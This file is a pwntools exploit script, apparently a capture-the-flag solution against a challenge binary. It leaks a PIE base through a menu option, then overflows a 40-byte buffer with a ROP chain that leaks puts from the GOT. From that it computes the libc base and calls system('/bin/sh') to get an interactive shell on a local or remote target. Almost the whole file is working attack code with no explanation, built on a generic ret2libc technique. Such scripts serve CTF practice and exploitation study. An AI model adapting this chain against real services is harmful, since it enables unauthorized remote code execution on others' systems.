#!/bin/env python3

from pwn import *
import sys

BINARY = "chall_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT and args.DBG:
            if script:
                attach(self.p, "\n".join(script))
            else:
                attach(self.p)


x, p = init()
x.debug((
    "b *vuln+96",
    "c",
    "c",
))

def exit():
    p.sendline(b'4')

def over():
    p.sendline(b'3')

def leakpie():
    p.sendline(b'2')
    p.sendline(b'1')
    p.recvuntil(b'untukmuu, ')
    a = int(p.recvline().strip(),16)
    return a

exe.address = leakpie() - 0x12ec
info(f"leak pie {hex(exe.address)}")
offset = 40

mov_rdi = exe.address + 0x00000000000011e7
pop_rbp = exe.address + 0x0000000000001173
ret = exe.address + 0x0000000000001016

over()
#leak puts
rop = p64(pop_rbp)
rop += p64(exe.got.puts)
rop += p64(mov_rdi)
rop += p64(0x0)
rop += p64(exe.sym.puts)
rop += p64(exe.sym.main)

payload = b"A"*offset
payload += rop
p.sendline(payload)

p.recvuntil(b'\n\n')
a = p.recvline().strip()
leak = u64(a.ljust(8,b'\x00'))
info(f"leak puts {hex(leak)}")


libc.address = leak - libc.symbols['puts']
info(f"libc address: {hex(libc.address)}")
rop = ROP(libc)
over()
rop.raw(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b'/bin/sh\x00'))])

p.sendline(flat(b'A'*(offset), rop.chain()))
p.interactive()


p.interactive()

p.interactive()
